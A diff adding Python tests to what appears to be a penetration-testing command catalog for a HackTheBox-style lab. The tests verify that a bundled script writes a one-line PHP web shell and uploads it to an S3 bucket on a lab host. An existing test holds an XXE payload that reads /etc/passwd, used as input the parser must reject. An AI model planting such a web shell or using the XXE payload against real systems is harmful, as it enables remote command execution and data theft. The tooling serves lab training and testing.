@@ -335,6 +335,19 @@ def test_s3_object_list_renders_with_a_bucket_name():
         "aws", "--endpoint-url=http://10.10.11.80:80", "s3", "ls", "s3://the-three.htb",
     ]
 
+def test_s3_webshell_upload_invokes_the_bundled_script_with_bucket_and_output_dir():
+    commands = {item["id"] for item in catalog.commands_for("http", 80)}
+    assert "s3-webshell-upload" not in commands
+    _, command, argv = catalog.render("s3-webshell-upload", {
+        "scheme": "http", "host": "10.10.11.80", "port": "80",
+        "path": "the-three.htb", "output_dir": "/opt/oscp-workspace/outputs",
+        "repo_dir": "/opt/oscp-workspace",
+    })
+    assert argv == [
+        "bash", "/opt/oscp-workspace/backend/scripts/s3_webshell_upload.sh",
+        "http://10.10.11.80:80", "the-three.htb", "/opt/oscp-workspace/outputs",
+    ]
+
 def test_laps_password_netexec_renders_with_manually_supplied_credentials():
     commands = {item["id"] for item in catalog.commands_for("ldap", 389)}
     assert "ad-laps-password-netexec" not in commands
@@ -474,6 +487,49 @@ def test_mysql_credential_probe_script_rejects_too_many_combinations(tmp_path):
     assert result.returncode == 2
     assert "상한 40개를 초과" in result.stdout
 
+
+def test_s3_webshell_upload_script_writes_the_webshell_and_calls_aws_cp(tmp_path):
+    script = Path(__file__).parents[1] / "scripts" / "s3_webshell_upload.sh"
+    # Stub out the real `aws` binary so this runs hermetically and just
+    # records the arguments it was called with.
+    fake_aws = tmp_path / "aws"
+    fake_aws.write_text(
+        "#!/usr/bin/env bash\n"
+        'echo "$@" > ' + str(tmp_path / "aws-args.txt") + "\n"
+        "exit 0\n")
+    fake_aws.chmod(0o755)
+    env = {**os.environ, "PATH": f"{tmp_path}:{os.environ['PATH']}"}
+    output_dir = tmp_path / "outputs"
+    output_dir.mkdir()
+
+    result = subprocess.run(
+        ["bash", str(script), "http://10.10.11.80:80", "the-three.htb", str(output_dir)],
+        capture_output=True, text=True, env=env, timeout=10)
+
+    assert result.returncode == 0
+    shell_path = output_dir / "shell.php"
+    assert shell_path.read_text() == '<?php system($_GET["cmd"]); ?>'
+    assert (tmp_path / "aws-args.txt").read_text().strip() == (
+        f"--endpoint-url=http://10.10.11.80:80 s3 cp {shell_path} s3://the-three.htb/shell.php")
+    assert "[+] Uploaded to s3://the-three.htb/shell.php" in result.stdout
+
+def test_s3_webshell_upload_script_strips_a_trailing_slash_from_the_bucket(tmp_path):
+    script = Path(__file__).parents[1] / "scripts" / "s3_webshell_upload.sh"
+    fake_aws = tmp_path / "aws"
+    fake_aws.write_text(
+        "#!/usr/bin/env bash\n"
+        'echo "$@" > ' + str(tmp_path / "aws-args.txt") + "\n"
+        "exit 0\n")
+    fake_aws.chmod(0o755)
+    env = {**os.environ, "PATH": f"{tmp_path}:{os.environ['PATH']}"}
+    output_dir = tmp_path / "outputs"
+    output_dir.mkdir()
+
+    subprocess.run(
+        ["bash", str(script), "http://10.10.11.80:80", "the-three.htb/", str(output_dir)],
+        capture_output=True, text=True, env=env, timeout=10)
+
+    assert "s3://the-three.htb/shell.php" in (tmp_path / "aws-args.txt").read_text()
 
 def test_xxe_rejected():
     bad=b'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><nmaprun>&e;</nmaprun>'
